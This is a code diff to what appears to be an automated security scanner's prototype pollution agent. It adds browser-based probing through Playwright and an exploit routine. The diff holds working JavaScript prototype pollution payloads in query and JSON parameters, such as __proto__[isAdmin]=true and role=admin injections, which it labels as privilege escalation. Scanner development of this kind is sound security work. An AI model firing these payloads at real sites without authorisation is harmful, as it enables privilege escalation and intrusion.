@@ -55,6 +55,8 @@ class PrototypePollutionAgent(BaseAgent, TechContextMixin):
         self.params = params or []
         self.report_dir = report_dir or Path("./reports")
         self._tested_vectors = set()  # Deduplication
+        self._client_side_pp_confirmed = False
+        self._client_side_pp_url = ""
 
         # Queue consumption mode (Phase 20)
         self._queue_mode = False
@@ -786,7 +788,19 @@ class PrototypePollutionAgent(BaseAgent, TechContextMixin):
         except Exception as e:
             logger.error(f"[{self.name}] HTML parsing failed: {e}")
 
-        # 3. Check if endpoint accepts JSON POST bodies (MOST COMMON PP VECTOR)
+        # 3. Add common PP-relevant param names as synthetic candidates.
+        # JS-only params (e.g., used in client-side deepMerge/$.extend) are invisible
+        # to HTML form extraction. These common names appear frequently across web apps.
+        pp_common_params = [
+            "filter", "config", "options", "data", "settings", "params",
+            "query", "json", "args", "obj", "merge", "extend", "input",
+            "payload", "body", "attributes", "properties", "fields",
+        ]
+        for common_param in pp_common_params:
+            if common_param not in all_params:
+                all_params[common_param] = ""
+
+        # 4. Check if endpoint accepts JSON POST bodies (MOST COMMON PP VECTOR)
         json_accepted = await self._probe_json_acceptance(url)
         if json_accepted:
             all_params["_accepts_json"] = "true"
@@ -1084,6 +1098,7 @@ Return ONLY unique findings in JSON format:
 
             # Execute Prototype Pollution attack
             try:
+                self.url = url
                 result = await self._test_single_item_from_queue(url, parameter, finding)
 
                 if result:
@@ -1346,7 +1361,15 @@ Return ONLY unique findings in JSON format:
                 except Exception:
                     pass  # JSON POST may not be accepted, that's fine
 
-                # No reaction at all
+                # No HTTP-level reaction — try client-side PP via Playwright
+                try:
+                    client_side = await self._smart_probe_client_side(url)
+                    if client_side:
+                        dashboard.log(f"[{self.name}] Smart probe: client-side PP detected via browser", "INFO")
+                        return True
+                except Exception as browser_err:
+                    logger.debug(f"[{self.name}] Browser probe error: {browser_err}")
+
                 dashboard.log(f"[{self.name}] Smart probe: endpoint ignores __proto__, skipping", "INFO")
                 return False
 
@@ -1354,12 +1377,91 @@ Return ONLY unique findings in JSON format:
             logger.debug(f"[{self.name}] Smart probe error: {e}")
             return True  # On error, continue testing (be safe)
 
+    async def _smart_probe_client_side(self, url: str) -> bool:
+        """
+        Playwright-based client-side prototype pollution probe.
+
+        Tests two vectors:
+        1. ?__proto__[btCSPP]=1 (URL param based PP)
+        2. ?filter={"__proto__":{"btCSPP":"1"}} (JSON param based PP via deepMerge)
+
+        Returns True if client-side PP is confirmed.
+        """
+        from bugtrace.tools.visual.browser import browser_manager
+        import urllib.parse
+
+        pp_json = urllib.parse.quote('{"__proto__":{"btCSPP":"1"}}')
+        json_params = ["filter", "config", "options", "data", "settings"]
+
+        # Build probe URLs: test both the given URL and the origin HTML page
+        # Client-side PP happens in frontend JS (e.g., deepMerge in custom.js),
+        # which only loads on HTML pages, not API endpoints
+        from urllib.parse import urlparse as _parse_url
+        parsed_origin = _parse_url(url)
+        origin_html = f"{parsed_origin.scheme}://{parsed_origin.netloc}/"
+        test_urls = [url]
+        if origin_html.rstrip('/') != url.rstrip('/'):
+            test_urls.append(origin_html)
+
+        for test_url in test_urls:
+            sep = "&" if "?" in test_url else "?"
+            probe_vectors = [
+                # Vector 1: URL param __proto__ pollution (Lodash, jQuery extend, etc.)
+                f"{sep}__proto__[btCSPP]=1",
+            ]
+            # Vector 2: JSON-based PP via common params (deepMerge, $.extend, etc.)
+            for jp in json_params:
+                probe_vectors.append(f"{sep}{jp}={pp_json}")
+
+            for suffix in probe_vectors:
+                probe_url = f"{test_url}{suffix}"
+                try:
+                    async with browser_manager.get_page() as page:
+                        await page.goto(probe_url, wait_until="networkidle", timeout=10000)
+                        # Wait a bit for DOMContentLoaded handlers to complete
+                        await page.wait_for_timeout(500)
+                        result = await page.evaluate("(() => { try { return ({}).btCSPP === '1'; } catch(e) { return false; } })()")
+                        if result:
+                            logger.info(f"[{self.name}] Client-side PP CONFIRMED on {test_url} via: {suffix[:60]}")
+                            self._client_side_pp_confirmed = True
+                            self._client_side_pp_url = test_url
+                            return True
+                except Exception as e:
+                    logger.debug(f"[{self.name}] Client-side PP probe failed for {suffix[:40]}: {e}")
+
+        return False
+
     async def _test_single_item_from_queue(self, url: str, param: str, finding: dict) -> Optional[Dict]:
         """Test a single item from queue for Prototype Pollution."""
+        from urllib.parse import urlparse
+
+        # Reset client-side flags for each new queue item
+        self._client_side_pp_confirmed = False
+        self._client_side_pp_url = None
+
         try:
-            # Smart probe: skip if endpoint ignores __proto__
-            if not await self._smart_probe_pollution(url):
+            # Smart probe: try finding URL first, then origin URL as fallback
+            probe_passed = await self._smart_probe_pollution(url)
+
+            if not probe_passed:
+                # Try origin URL (root) as fallback for client-side PP
+                parsed = urlparse(url)
+                origin_url = f"{parsed.scheme}://{parsed.netloc}/"
+                if origin_url != url and origin_url.rstrip('/') != url.rstrip('/'):
+                    logger.info(f"[{self.name}] Smart probe: trying origin URL {origin_url}")
+                    self.url = origin_url
+                    probe_passed = await self._smart_probe_pollution(origin_url)
+                    if probe_passed:
+                        url = origin_url
+
+            if not probe_passed:
                 return None
+
+            # Client-side PP was confirmed by the browser probe — return validated finding
+            if getattr(self, '_client_side_pp_confirmed', False):
+                pp_url = getattr(self, '_client_side_pp_url', url)
+                logger.info(f"[{self.name}] Client-side PP validated via Playwright on {pp_url}")
+                return await self._exploit_client_side_pp(pp_url, param)
 
             # Run hunter phase to discover vectors
             vectors = await self._hunter_phase()
@@ -1377,6 +1479,95 @@ Return ONLY unique findings in JSON format:
         except Exception as e:
             logger.error(f"[{self.name}] Queue item test failed: {e}")
             return None
+
+    async def _exploit_client_side_pp(self, url: str, param: str) -> Optional[Dict]:
+        """
+        Exploit and document confirmed client-side prototype pollution.
+
+        Tests multiple __proto__ payloads via Playwright to determine impact.
+        """
+        from bugtrace.tools.visual.browser import browser_manager
+
+        successful_payloads = []
+        impact_details = {}
+        import urllib.parse
+
+        # JSON-based payloads (for deepMerge/$.extend patterns)
+        json_params = ["filter", "config", "options", "data", "settings"]
+        json_payloads = [
+            ('{"__proto__":{"isAdmin":true}}', "isAdmin", "true", "Privilege escalation via isAdmin flag"),
+            ('{"__proto__":{"role":"admin"}}', "role", "admin", "Role escalation via role property"),
+            ('{"__proto__":{"debug":true}}', "debug", "true", "Debug mode activation"),
+            ('{"constructor":{"prototype":{"btPP":"1"}}}', "btPP", "1", "Constructor-based pollution"),
+        ]
+
+        # Also try URL param-based payloads
+        url_payloads = [
+            ("__proto__[isAdmin]=true", "isAdmin", "true", "URL param PP: isAdmin"),
+            ("__proto__[role]=admin", "role", "admin", "URL param PP: role"),
+        ]
+
+        separator = "&" if "?" in url else "?"
+
+        # Test JSON-based payloads via common param names
+        for json_val, prop, expected_val, desc in json_payloads:
+            for json_param in json_params:
+                try:
+                    encoded = urllib.parse.quote(json_val)
+                    test_url = f"{url}{separator}{json_param}={encoded}"
+                    async with browser_manager.get_page() as page:
+                        await page.goto(test_url, wait_until="networkidle", timeout=10000)
+                        check_js = f"(() => {{ try {{ return String(({{}}).{prop}); }} catch(e) {{ return ''; }} }})()"
+                        result = await page.evaluate(check_js)
+                        if result == expected_val:
+                            payload_desc = f"{json_param}={json_val}"
+                            successful_payloads.append(payload_desc)
+                            impact_details[prop] = desc
+                            break  # Found working param, skip others
+                except Exception as e:
+                    logger.debug(f"[{self.name}] Client-side PP payload failed: {e}")
+
+        # Test URL param-based payloads
+        for payload_qs, prop, expected_val, desc in url_payloads:
+            if prop in impact_details:
+                continue  # Already confirmed via JSON
+            try:
+                test_url = f"{url}{separator}{payload_qs}"
+                async with browser_manager.get_page() as page:
+                    await page.goto(test_url, wait_until="networkidle", timeout=10000)
+                    check_js = f"(() => {{ try {{ return String(({{}}).{prop}); }} catch(e) {{ return ''; }} }})()"
+                    result = await page.evaluate(check_js)
+                    if result == expected_val:
+                        successful_payloads.append(payload_qs)
+                        impact_details[prop] = desc
+            except Exception as e:
+                logger.debug(f"[{self.name}] Client-side PP payload failed: {e}")
+
+        return {
+            "type": "PROTOTYPE_POLLUTION",
+            "url": url,
+            "parameter": param or "__proto__",
+            "payload": successful_payloads[0] if successful_payloads else "__proto__[btCSPP]=1",
+            "technique": "client-side prototype pollution",
+            "tier": "pollution_detection",
+            "severity": "HIGH",
+            "status": "VALIDATED_CONFIRMED",
+            "validated": True,
+            "exploitable": True,
+            "pollution_confirmed": True,
+            "engine_type": "client-side",
+            "evidence": {
+                "pollution_verified": True,
+                "client_side": True,
+                "successful_payloads": successful_payloads,
+                "impact": impact_details,
+                "method": "Playwright browser evaluation",
+            },
+            "description": f"Client-side Prototype Pollution confirmed via browser. "
+                          f"Object.prototype is pollutable via query parameters. "
+                          f"{len(successful_payloads)} payloads confirmed.",
+            "successful_payloads": successful_payloads,
+        }
 
     def _generate_protopollution_fingerprint(self, url: str, parameter: str) -> tuple:
         """
